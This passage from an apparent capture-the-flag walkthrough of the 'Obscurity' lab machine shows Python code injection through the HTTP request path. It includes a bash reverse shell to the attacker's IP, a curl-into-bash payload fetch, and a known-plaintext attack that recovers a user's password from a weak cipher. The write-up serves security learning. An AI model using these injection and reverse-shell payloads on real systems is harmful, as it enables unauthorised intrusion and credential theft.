+<p>In many Python injections, I’d have to worry getting a reference to the <code class="language-plaintext highlighter-rouge">os</code> module, but since it’s already imported into this script, I don’t have to worry about that. If I wanted to run processes using <code class="language-plaintext highlighter-rouge">subprocess</code> instead of <code class="language-plaintext highlighter-rouge">os</code>, I’d need to do that.</p>
+<h4 id="poc">POC</h4>
+<p>Now to prove this on Obscurity, I’ll try to write a payload to test this exploit. Since I don’t think I’ll see the results of the run, I’ll try to <code class="language-plaintext highlighter-rouge">ping</code> myself. I’ll use a payload of:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="sh">'</span><span class="s">;os.system(</span><span class="sh">'</span><span class="n">ping</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">c</span><span class="o">%</span><span class="mi">201</span><span class="o">%</span><span class="mf">2010.10</span><span class="p">.</span><span class="mf">14.19</span><span class="sh">'</span><span class="s">);</span><span class="sh">'</span>
+</code></pre></div></div>
+<p>I’ll start <code class="language-plaintext highlighter-rouge">tcpdump</code> to listen for ICMP. Then I’ll visit the page root through Burp, and then find that request and send it to Repeater. There I’ll modify the request to:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/';os.system('ping%20-c%201%2010.10.14.19');'</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.168:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+</code></pre></div></div>
+<p>When the web server splits on space (before the <code class="language-plaintext highlighter-rouge">%20</code>s are decoded to spaces), it should get my injection into the <code class="language-plaintext highlighter-rouge">path</code> variable. When I send this, I get a ping:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>tcpdump <span class="nt">-n</span> <span class="nt">-i</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+08:27:13.007310 IP 10.10.10.168 &gt; 10.10.14.19: ICMP echo request, id 20509, seq 1, length 64
+08:27:13.007361 IP 10.10.14.19 &gt; 10.10.10.168: ICMP echo reply, id 20509, seq 1, length 64
+</span></code></pre></div></div>
+<p>I’ve got code execution.</p>
+<h3 id="shell">Shell</h3>
+<p>The make things simple and limit spaces, I’ll create a file in my current folder called <code class="language-plaintext highlighter-rouge">shell</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>Now I’ll use Python to server this, and have my injection just use <code class="language-plaintext highlighter-rouge">curl</code> to get it and pipe it into <code class="language-plaintext highlighter-rouge">bash</code>. In Repeater:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/';os.system('curl%2010.10.14.19/shell|bash');'</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.168:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+</code></pre></div></div>
+<p>When I send that, I see a hit on the Python webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 80
+<span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.168 - - [01/Dec/2019 09:13:15] "GET /shell HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>And then a shell on the <code class="language-plaintext highlighter-rouge">nc</code> listener as www-data:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.168.
+Ncat: Connection from 10.10.10.168:37652.
+</span><span class="gp">www-data@obscure:/$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h2 id="priv-www-data--robert">Priv: www-data –&gt; robert</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>With a shell on the box, one of the places I always check out is <code class="language-plaintext highlighter-rouge">/home</code>. In this case, there’s one user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@obscure:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">robert
+</span></code></pre></div></div>
+<p>In robert’s homedir, I find <code class="language-plaintext highlighter-rouge">user.txt</code>, but I can’t read it. There’s a few other files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> 
+<span class="go">total 24
+drwx------ 2 robert robert 4096 Oct  5 13:09 BetterSSH
+-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt
+-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
+-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
+-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
+-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
+</span></code></pre></div></div>
+<p>While <code class="language-plaintext highlighter-rouge">BetterSSH</code> is certainly interesting (and almost certainly exploitable), I can’t access it as www-data, so I’ll move on for now.</p>
+<p>The rest of the files are related. When I run <code class="language-plaintext highlighter-rouge">SuperSecureCrypt.py</code> with <code class="language-plaintext highlighter-rouge">-h</code>, I get the options:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span>python3 SuperSecureCrypt.py <span class="nt">-h</span>
+<span class="go">usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d]
+
+Encrypt with 0bscura's encryption algorithm
+
+optional arguments:
+  -h, --help  show this help message and exit
+  -i InFile   The file to read
+  -o OutFile  Where to output the encrypted/decrypted file
+  -k Key      Key to use
+  -d          Decrypt mode
+</span></code></pre></div></div>
+<p>With the three <code class="language-plaintext highlighter-rouge">.txt</code> files, two are UFT-8, and one is ASCII:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span>file <span class="k">*</span>.txt
+<span class="go">check.txt:            ASCII text, with CRLF line terminators
+out.txt:              UTF-8 Unicode text, with NEL line terminators
+passwordreminder.txt: UTF-8 Unicode text, with no line terminators
+user.txt:             regular file, no read permission
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">check.txt</code> is readable:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span><span class="nb">cat </span>check.txt 
+<span class="go">Encrypting this file with your key should result in out.txt, make sure your key is correct! 
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">out.txt</code> and <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code> are not:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span><span class="nb">cat </span>out.txt 
+<span class="go">¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
+</span><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span><span class="nb">cat </span>passwordreminder.txt 
+<span class="go">´ÑÈÌÉàÙÁÑé¯·¿k
+</span></code></pre></div></div>
+<p>I can also check out the source for <code class="language-plaintext highlighter-rouge">SuperSecureCrypt.py</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">argparse</span>
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">encrypted</span> <span class="o">=</span> <span class="sh">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nf">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">+</span> <span class="nf">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">encrypted</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="sh">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nf">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="nf">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">decrypted</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Encrypt with 0bscura</span><span class="se">\'</span><span class="s">s encryption algorithm</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-i</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">InFile</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">The file to read</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-o</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">OutFile</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Where to output the encrypted/decrypted file</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-k</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="sh">'</span><span class="s">Key</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Key to use</span><span class="sh">'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-d</span><span class="sh">'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Decrypt mode</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+<span class="n">banner</span> <span class="o">=</span> <span class="sh">"</span><span class="s">################################</span><span class="se">\n</span><span class="sh">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="sh">"</span><span class="s">#           BEGINNING          #</span><span class="se">\n</span><span class="sh">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="sh">"</span><span class="s">#    SUPER SECURE ENCRYPTOR    #</span><span class="se">\n</span><span class="sh">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="sh">"</span><span class="s">################################</span><span class="se">\n</span><span class="sh">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">  ############################</span><span class="se">\n</span><span class="sh">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">  #        FILE MODE         #</span><span class="se">\n</span><span class="sh">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">  ############################</span><span class="sh">"</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">o</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">i</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Missing args</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">d</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Opening file {0}...</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Decrypting...</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">=</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span><span class="p">)</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Writing to {0}...</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Opening file {0}...</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">i</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Encrypting...</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">encrypted</span> <span class="o">=</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">k</span><span class="p">)</span>
+
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Writing to {0}...</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">))</span>
+        <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">o</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="get-key">Get Key</h3>
+<h4 id="details">Details</h4>
+<p>Given that I have both the plaintext and the ciphertext for <code class="language-plaintext highlighter-rouge">check.txt</code>, I can look at the code above for known plaintext attacks. In this case, I’ll see that “encryption” is just looping over the plaintext and the key and adding them together mod 255, and writing the output. That means that for each byte, if I subtract the plaintext byte from the ciphertext byte, I’ll get the key byte.</p>
+<p>I’ll just open a Python terminal on Obscurity and read the files, being careful of formatting (the ciphertext is written out as UTF-8, so I’ll read it in that way).</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">www-data@obscure:/home/robert$ python3
+Python 3.6.8 (default, Aug 20 2019, 17:12:48)
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">check.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<span class="go">...     plain = f.read()
+</span><span class="c">...
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">plain</span>
+<span class="go">'Encrypting this file with your key should result in out.txt, make sure your key is correct! \n'
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">out.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<span class="go">...    cipher = f.read()
+</span><span class="c">...
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
+<span class="go">93
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">len</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
+<span class="go">93
+</span></code></pre></div></div>
+<p>The fact that they are the same length is a good sanity check. Now I’ll use a list comprehension to loop over the bytes, subtracting them:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span><span class="p">,</span><span class="n">p</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span><span class="n">plain</span><span class="p">)])</span>
+<span class="go">'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal'
+</span></code></pre></div></div>
+<p>To break that down:</p>
+<ul>
+<li>
+<p><code class="language-plaintext highlighter-rouge">zip</code> takes two arrays and creates an array of pairs so you can work with them at the same time. For example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nf">zip</span><span class="p">(</span><span class="sh">'</span><span class="s">abc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">def</span><span class="sh">'</span><span class="p">)</span>
+<span class="go">[('a', 'd'), ('b', 'e'), ('c', 'f')]
+</span></code></pre></div> </div>
+</li>
+<li>
+<p>So <code class="language-plaintext highlighter-rouge">[chr(ord(c)-ord(p)) for c,p in zip(cipher,plain)]</code> will take each pair of <code class="language-plaintext highlighter-rouge">c</code> and <code class="language-plaintext highlighter-rouge">p</code>, and return an array with each item being <code class="language-plaintext highlighter-rouge">chr(ord(c)-ord(p))</code>. That’s just converting each byte into an int, subtracting, and then converting the result back to a character.</p>
+</li>
+<li>
+<p><code class="language-plaintext highlighter-rouge">''.join()</code> just takes an array, and joins each element with, in this case, the empty string.</p>
+</li>
+</ul>
+<p>I’ll see that the key is “alexandrovich”.</p>
+<h4 id="shortcut">Shortcut</h4>
+<p>I looked at the code to see that I could get the key by subtracting the plaintext from the cipher text. I did that in Python, but <code class="language-plaintext highlighter-rouge">SuperSecureCrypt.py</code> does that too. So I can get the key by calling it in decrypt mode with the ciphertext and the plaintext as the key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span>python3 SuperSecureCrypt.py <span class="nt">-i</span> out.txt <span class="nt">-k</span> <span class="s2">"Encrypting this file with your key should result in out.txt, make sure your key is correct!"</span> <span class="nt">-d</span> <span class="nt">-o</span> /dev/shm/key.txt
+<span class="c">################################
+#           BEGINNING          #
+#    SUPER SECURE ENCRYPTOR    #
+################################
+  ############################
+  #        FILE MODE         #
+  ############################
+</span><span class="go">Opening file out.txt...
+Decrypting...
+Writing to /dev/shm/key.txt...
+</span><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span><span class="nb">cat</span> /dev/shm/key.txt
+<span class="go">alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
+</span></code></pre></div></div>
+<h3 id="get-password">Get Password</h3>
+<p>With the key, I can just run the program to get the plaintext of <code class="language-plaintext highlighter-rouge">passwordreminder.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span>python3 SuperSecureCrypt.py <span class="nt">-i</span> passwordreminder.txt <span class="nt">-d</span> <span class="nt">-k</span> alexandrovich <span class="nt">-o</span> /dev/shm/.df
+<span class="c">################################
+#           BEGINNING          #
+#    SUPER SECURE ENCRYPTOR    #
+################################
+  ############################
+  #        FILE MODE         #
+  ############################
+</span><span class="go">Opening file passwordreminder.txt...
+Decrypting...
+Writing to /dev/shm/.df...
+</span><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span><span class="nb">cat</span> /dev/shm/.df
+<span class="go">SecThruObsFTW
+</span><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span><span class="nb">rm</span> /dev/shm/.df 
+</code></pre></div></div>
+<p>I could also just do the “decryption” in the same Python terminal:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">key</span> <span class="o">=</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span><span class="p">,</span><span class="n">p</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span><span class="n">plain</span><span class="p">)])</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">passwordreminder.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">UTF-8</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<span class="go">...     cipher2 = f.read()
+</span><span class="c">... 
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">-</span><span class="nf">ord</span><span class="p">(</span><span class="n">k</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span><span class="p">,</span><span class="n">k</span> <span class="ow">in</span> <span class="nf">zip</span><span class="p">(</span><span class="n">cipher2</span><span class="p">,</span> <span class="n">key</span><span class="p">)])</span>
+<span class="go">'SecThruObsFTW\n'
+</span></code></pre></div></div>
+<h3 id="shell-over-ssh">Shell over SSH</h3>
+<p>With robert’s password, I can get an SSH shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh robert@10.10.10.168
+<span class="go">The authenticity of host '10.10.10.168 (10.10.10.168)' can't be established.
+ECDSA key fingerprint is SHA256:H6t3x5IXxyijmFEZ2NVZbIZHWZJZ0d1IDDj3OnABJDw.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
